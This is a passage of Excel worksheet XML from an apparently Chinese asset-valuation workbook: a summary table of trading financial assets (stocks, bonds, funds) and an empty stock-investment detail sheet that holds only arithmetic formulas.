    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>交易性金融资产评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="I2" s="376" t="n"/>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表3-2</t>
        </is>
      </c>
      <c r="I3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="I4" s="376" t="n"/>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="323" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="284" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="344" t="n"/>
    </row>
    <row r="6" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>3-2-1</t>
        </is>
      </c>
      <c r="C6" s="284" t="inlineStr">
        <is>
          <t>交融股票</t>
        </is>
      </c>
      <c r="D6" s="284" t="inlineStr">
        <is>
          <t>交易性金融资产-股票投资</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'3-2-1-股票'!H29</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'3-2-1-股票'!J29</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="347" t="n"/>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>3-2-2</t>
        </is>
      </c>
      <c r="C7" s="284" t="inlineStr">
        <is>
          <t>交融债券</t>
        </is>
      </c>
      <c r="D7" s="284" t="inlineStr">
        <is>
          <t>交易性金融资产-债券投资</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'3-2-2-债券'!I29</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'3-2-2-债券'!J29</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="347" t="n"/>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>3-2-3</t>
        </is>
      </c>
      <c r="C8" s="284" t="inlineStr">
        <is>
          <t>交融基金</t>
        </is>
      </c>
      <c r="D8" s="284" t="inlineStr">
        <is>
          <t>交易性金融资产-基金投资</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'3-2-3-基金'!H31</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'3-2-3-基金'!J31</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="347" t="n"/>
    </row>
    <row r="9" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B9" s="284" t="n"/>
      <c r="C9" s="284" t="n"/>
      <c r="D9" s="284" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="347" t="n"/>
    </row>
    <row r="10" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="383" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="347" t="n"/>
    </row>
    <row r="11" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="383" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="347" t="n"/>
    </row>
    <row r="12" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="383" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="347" t="n"/>
    </row>
    <row r="13" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="383" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="347" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="383" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="347" t="n"/>
    </row>
    <row r="15" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="383" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="347" t="n"/>
    </row>
    <row r="16" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="383" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="347" t="n"/>
    </row>
    <row r="17" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="383" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="347" t="n"/>
    </row>
    <row r="18" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="383" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="347" t="n"/>
    </row>
    <row r="19" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="383" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="347" t="n"/>
    </row>
    <row r="20" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="383" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="347" t="n"/>
    </row>
    <row r="21" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="383" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="347" t="n"/>
    </row>
    <row r="22" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="383" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="347" t="n"/>
    </row>
    <row r="23" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="383" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="347" t="n"/>
    </row>
    <row r="24" ht="17.25" customFormat="1" customHeight="1" s="342">
      <c r="A24" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="inlineStr">
        <is>
          <t>交融汇总</t>
        </is>
      </c>
      <c r="D24" s="170" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="E24" s="555">
        <f>SUM(E6:E23)</f>
        <v/>
      </c>
      <c r="F24" s="555">
        <f>SUM(F6:F23)</f>
        <v/>
      </c>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="347" t="n"/>
    </row>
    <row r="25" s="415">
      <c r="B25" s="346" t="n"/>
      <c r="C25" s="346" t="n"/>
      <c r="D25" s="347" t="n"/>
      <c r="E25" s="347" t="n"/>
      <c r="F25" s="325" t="n"/>
      <c r="I25" s="347" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="F25:H25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15.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet15">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="15.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="9" customWidth="1" style="410" min="4" max="4"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="7.83333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="11.8333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="14.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="13.8333333333333" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="8.5" customWidth="1" style="410" min="12" max="12"/>
    <col width="9.66666666666667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交易性金融资产—股票投资评估明细表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402" t="inlineStr">
        <is>
          <t>表3-2-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.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176" t="n"/>
      <c r="M4" s="176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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>股票名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>持股数量</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>成  本</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>基准日收盘价元/股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Format="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="572" t="n"/>
      <c r="C6" s="573" t="n"/>
      <c r="D6" s="574" t="n"/>
      <c r="E6" s="572" t="n"/>
      <c r="F6" s="575" t="n"/>
      <c r="G6" s="575" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="575" t="n"/>
      <c r="J6" s="575" t="n"/>
      <c r="K6" s="555">
        <f>J6-H6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(H6=0,"",K6/H6*100)</f>
        <v/>
      </c>
      <c r="M6" s="576" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="572" t="n"/>
      <c r="C7" s="577" t="n"/>
      <c r="D7" s="572" t="n"/>
      <c r="E7" s="572" t="n"/>
      <c r="F7" s="575" t="n"/>
      <c r="G7" s="575" t="n"/>
      <c r="H7" s="575" t="n"/>
      <c r="I7" s="575" t="n"/>
      <c r="J7" s="575" t="n"/>
      <c r="K7" s="555">
        <f>J7-H7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(H7=0,"",K7/H7*100)</f>
        <v/>
      </c>
      <c r="M7" s="576" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="572" t="n"/>
      <c r="C8" s="577" t="n"/>
      <c r="D8" s="572" t="n"/>
      <c r="E8" s="572" t="n"/>
      <c r="F8" s="575" t="n"/>
      <c r="G8" s="575" t="n"/>
      <c r="H8" s="575" t="n"/>
      <c r="I8" s="575" t="n"/>
      <c r="J8" s="575" t="n"/>
      <c r="K8" s="555">
        <f>J8-H8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(H8=0,"",K8/H8*100)</f>
        <v/>
      </c>
      <c r="M8" s="576" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="572" t="n"/>
      <c r="C9" s="577" t="n"/>
      <c r="D9" s="572" t="n"/>
      <c r="E9" s="572" t="n"/>
      <c r="F9" s="575" t="n"/>
      <c r="G9" s="575" t="n"/>
      <c r="H9" s="575" t="n"/>
      <c r="I9" s="575" t="n"/>
      <c r="J9" s="575" t="n"/>
      <c r="K9" s="555">
        <f>J9-H9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(H9=0,"",K9/H9*100)</f>
        <v/>
      </c>
      <c r="M9" s="576" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="572" t="n"/>
      <c r="C10" s="577" t="n"/>
      <c r="D10" s="572" t="n"/>
      <c r="E10" s="572" t="n"/>
      <c r="F10" s="575" t="n"/>
      <c r="G10" s="575" t="n"/>
      <c r="H10" s="575" t="n"/>
      <c r="I10" s="575" t="n"/>
      <c r="J10" s="575" t="n"/>
      <c r="K10" s="555">
        <f>J10-H10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(H10=0,"",K10/H10*100)</f>
        <v/>
      </c>
      <c r="M10" s="576" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="572" t="n"/>
      <c r="C11" s="577" t="n"/>
      <c r="D11" s="572" t="n"/>
      <c r="E11" s="572" t="n"/>
      <c r="F11" s="575" t="n"/>
      <c r="G11" s="575" t="n"/>
      <c r="H11" s="575" t="n"/>
      <c r="I11" s="575" t="n"/>
      <c r="J11" s="575" t="n"/>
      <c r="K11" s="555">
        <f>J11-H11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(H11=0,"",K11/H11*100)</f>
        <v/>
      </c>
      <c r="M11" s="576" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="572" t="n"/>
      <c r="C12" s="577" t="n"/>
      <c r="D12" s="572" t="n"/>
      <c r="E12" s="572" t="n"/>
      <c r="F12" s="575" t="n"/>
      <c r="G12" s="575" t="n"/>
      <c r="H12" s="575" t="n"/>
      <c r="I12" s="575" t="n"/>
      <c r="J12" s="575" t="n"/>
      <c r="K12" s="555">
        <f>J12-H12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(H12=0,"",K12/H12*100)</f>
        <v/>
      </c>
      <c r="M12" s="576" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="572" t="n"/>
      <c r="C13" s="577" t="n"/>
      <c r="D13" s="572" t="n"/>
      <c r="E13" s="572" t="n"/>
      <c r="F13" s="575" t="n"/>
      <c r="G13" s="575" t="n"/>
      <c r="H13" s="575" t="n"/>
      <c r="I13" s="575" t="n"/>
      <c r="J13" s="575" t="n"/>
      <c r="K13" s="555">
        <f>J13-H13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(H13=0,"",K13/H13*100)</f>
        <v/>
      </c>
      <c r="M13" s="576" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="572" t="n"/>
      <c r="C14" s="577" t="n"/>
      <c r="D14" s="572" t="n"/>
      <c r="E14" s="572" t="n"/>
      <c r="F14" s="575" t="n"/>
      <c r="G14" s="575" t="n"/>
      <c r="H14" s="575" t="n"/>
      <c r="I14" s="575" t="n"/>
      <c r="J14" s="575" t="n"/>
      <c r="K14" s="555">
        <f>J14-H14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(H14=0,"",K14/H14*100)</f>
        <v/>
      </c>
      <c r="M14" s="576" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="572" t="n"/>
      <c r="C15" s="577" t="n"/>
      <c r="D15" s="572" t="n"/>
      <c r="E15" s="572" t="n"/>
      <c r="F15" s="575" t="n"/>
      <c r="G15" s="575" t="n"/>
      <c r="H15" s="575" t="n"/>
      <c r="I15" s="575" t="n"/>
      <c r="J15" s="575" t="n"/>
      <c r="K15" s="555">
        <f>J15-H15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(H15=0,"",K15/H15*100)</f>
        <v/>
      </c>
      <c r="M15" s="576" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="572" t="n"/>
      <c r="C16" s="577" t="n"/>
      <c r="D16" s="572" t="n"/>
      <c r="E16" s="572" t="n"/>
      <c r="F16" s="575" t="n"/>
      <c r="G16" s="575" t="n"/>
      <c r="H16" s="575" t="n"/>
      <c r="I16" s="575" t="n"/>
      <c r="J16" s="575" t="n"/>
      <c r="K16" s="555">
        <f>J16-H16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(H16=0,"",K16/H16*100)</f>
        <v/>
      </c>
      <c r="M16" s="576" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="572" t="n"/>
      <c r="C17" s="577" t="n"/>
      <c r="D17" s="572" t="n"/>
      <c r="E17" s="572" t="n"/>
      <c r="F17" s="575" t="n"/>
      <c r="G17" s="575" t="n"/>
      <c r="H17" s="575" t="n"/>
      <c r="I17" s="575" t="n"/>
      <c r="J17" s="575" t="n"/>
      <c r="K17" s="555">
        <f>J17-H17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(H17=0,"",K17/H17*100)</f>
        <v/>
      </c>
      <c r="M17" s="576" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="572" t="n"/>
      <c r="C18" s="577" t="n"/>
      <c r="D18" s="572" t="n"/>
      <c r="E18" s="572" t="n"/>
      <c r="F18" s="575" t="n"/>
      <c r="G18" s="575" t="n"/>
      <c r="H18" s="575" t="n"/>
      <c r="I18" s="575" t="n"/>
      <c r="J18" s="575" t="n"/>
      <c r="K18" s="555">
        <f>J18-H18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(H18=0,"",K18/H18*100)</f>
        <v/>
      </c>
      <c r="M18" s="576" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="572" t="n"/>
      <c r="C19" s="577" t="n"/>
      <c r="D19" s="572" t="n"/>
      <c r="E19" s="572" t="n"/>
      <c r="F19" s="575" t="n"/>
      <c r="G19" s="575" t="n"/>
      <c r="H19" s="575" t="n"/>
      <c r="I19" s="575" t="n"/>
      <c r="J19" s="575" t="n"/>
      <c r="K19" s="555">
        <f>J19-H19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(H19=0,"",K19/H19*100)</f>
        <v/>
      </c>
      <c r="M19" s="576" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="572" t="n"/>
      <c r="C20" s="577" t="n"/>
      <c r="D20" s="572" t="n"/>
      <c r="E20" s="572" t="n"/>
      <c r="F20" s="575" t="n"/>
      <c r="G20" s="575" t="n"/>
      <c r="H20" s="575" t="n"/>
      <c r="I20" s="575" t="n"/>
      <c r="J20" s="575" t="n"/>
      <c r="K20" s="555">
        <f>J20-H20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(H20=0,"",K20/H20*100)</f>
        <v/>
      </c>
      <c r="M20" s="576" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="572" t="n"/>
      <c r="C21" s="577" t="n"/>
      <c r="D21" s="572" t="n"/>
      <c r="E21" s="572" t="n"/>
      <c r="F21" s="575" t="n"/>
      <c r="G21" s="575" t="n"/>
      <c r="H21" s="575" t="n"/>
      <c r="I21" s="575" t="n"/>
      <c r="J21" s="575" t="n"/>
      <c r="K21" s="555">
        <f>J21-H21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(H21=0,"",K21/H21*100)</f>
        <v/>
      </c>
      <c r="M21" s="576" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="572" t="n"/>
      <c r="C22" s="577" t="n"/>
      <c r="D22" s="572" t="n"/>
      <c r="E22" s="572" t="n"/>
      <c r="F22" s="575" t="n"/>
      <c r="G22" s="575" t="n"/>
      <c r="H22" s="575" t="n"/>
      <c r="I22" s="575" t="n"/>
      <c r="J22" s="575" t="n"/>
      <c r="K22" s="555">
        <f>J22-H22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(H22=0,"",K22/H22*100)</f>
        <v/>
      </c>
      <c r="M22" s="576" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="572" t="n"/>
      <c r="C23" s="577" t="n"/>
      <c r="D23" s="572" t="n"/>
      <c r="E23" s="572" t="n"/>
      <c r="F23" s="575" t="n"/>
      <c r="G23" s="575" t="n"/>
      <c r="H23" s="575" t="n"/>
      <c r="I23" s="575" t="n"/>
      <c r="J23" s="575" t="n"/>
      <c r="K23" s="555">
        <f>J23-H23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(H23=0,"",K23/H23*100)</f>
        <v/>
      </c>
      <c r="M23" s="576" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="572" t="n"/>
      <c r="C24" s="577" t="n"/>
      <c r="D24" s="572" t="n"/>
      <c r="E24" s="572" t="n"/>
      <c r="F24" s="575" t="n"/>
      <c r="G24" s="575" t="n"/>
      <c r="H24" s="575" t="n"/>
      <c r="I24" s="575" t="n"/>
      <c r="J24" s="575" t="n"/>
      <c r="K24" s="555">
        <f>J24-H24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(H24=0,"",K24/H24*100)</f>
        <v/>
      </c>
      <c r="M24" s="576" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="572" t="n"/>
      <c r="C25" s="577" t="n"/>
      <c r="D25" s="572" t="n"/>
      <c r="E25" s="572" t="n"/>
      <c r="F25" s="575" t="n"/>
      <c r="G25" s="575" t="n"/>
      <c r="H25" s="575" t="n"/>
      <c r="I25" s="575" t="n"/>
      <c r="J25" s="575" t="n"/>
      <c r="K25" s="555">
        <f>J25-H25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(H25=0,"",K25/H25*100)</f>
        <v/>
      </c>
      <c r="M25" s="576" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="572" t="n"/>
      <c r="C26" s="577" t="n"/>
      <c r="D26" s="572" t="n"/>
      <c r="E26" s="572" t="n"/>
      <c r="F26" s="575" t="n"/>
      <c r="G26" s="575" t="n"/>
      <c r="H26" s="575" t="n"/>
      <c r="I26" s="575" t="n"/>
      <c r="J26" s="575" t="n"/>
      <c r="K26" s="555">
        <f>J26-H26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(H26=0,"",K26/H26*100)</f>
        <v/>
      </c>
      <c r="M26" s="576" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="572" t="n"/>
      <c r="C27" s="577" t="n"/>
      <c r="D27" s="572" t="n"/>
      <c r="E27" s="572" t="n"/>
      <c r="F27" s="575" t="n"/>
      <c r="G27" s="575" t="n"/>
      <c r="H27" s="575" t="n"/>
      <c r="I27" s="575" t="n"/>
      <c r="J27" s="575" t="n"/>
      <c r="K27" s="555">
        <f>J27-H27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(H27=0,"",K27/H27*100)</f>
        <v/>
      </c>
      <c r="M27" s="576" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="572" t="n"/>
      <c r="C28" s="577" t="n"/>
      <c r="D28" s="572" t="n"/>
      <c r="E28" s="572" t="n"/>
      <c r="F28" s="575" t="n"/>
      <c r="G28" s="575" t="n"/>
      <c r="H28" s="575" t="n"/>
      <c r="I28" s="575" t="n"/>
      <c r="J28" s="575" t="n"/>
      <c r="K28" s="555">
        <f>J28-H28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(H28=0,"",K28/H28*100)</f>
        <v/>
      </c>
      <c r="M28" s="576" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="572" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="576" t="n"/>
      <c r="E29" s="572" t="n"/>
      <c r="F29" s="576" t="n"/>
      <c r="G29" s="575">
        <f>ROUND(SUM(G6:G28),2)</f>
        <v/>
      </c>
      <c r="H29" s="575">
        <f>ROUND(SUM(H6:H28),2)</f>
        <v/>
      </c>
      <c r="I29" s="575" t="n"/>
      <c r="J29" s="575">
        <f>ROUND(SUM(J6:J28),2)</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>J29-H29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(H29=0,"",K29/H29*100)</f>
        <v/>
      </c>
